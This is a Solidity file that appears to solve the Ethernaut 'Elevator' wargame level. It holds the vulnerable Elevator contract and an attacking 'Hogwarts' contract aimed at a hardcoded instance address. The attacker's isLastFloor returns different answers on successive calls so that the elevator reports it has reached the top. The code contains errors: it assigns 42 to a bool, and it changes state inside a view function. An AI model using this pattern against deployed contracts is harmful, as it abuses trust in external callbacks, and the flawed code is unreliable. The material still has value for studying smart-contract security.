pragma solidity ^0.4.18;


interface Building {
  function isLastFloor(uint) view public returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Hogwarts is Building {
  bool public magicStairsMoving = false;
  bool public topFloor = 42;
  address public ElevatorAddr = 0x0c7a0aca6ec64c44c9d03e22d42ff48023eb0b0f;
  Elevator public elevator;

  function Hogwarts() {
    elevator = Elevator(ElevatorAddr);
  }

  function isLastFloor(uint _floor) view public returns (bool){
    if(magicStairsMoving){
      return true;
    }
    else{
      magicStairsMoving = !magicStairsMoving;
      return _floor == topFloor;
    }
  }

  function goingUp(uint _floor) public{
    elevator.goTo(_floor);
  }
}

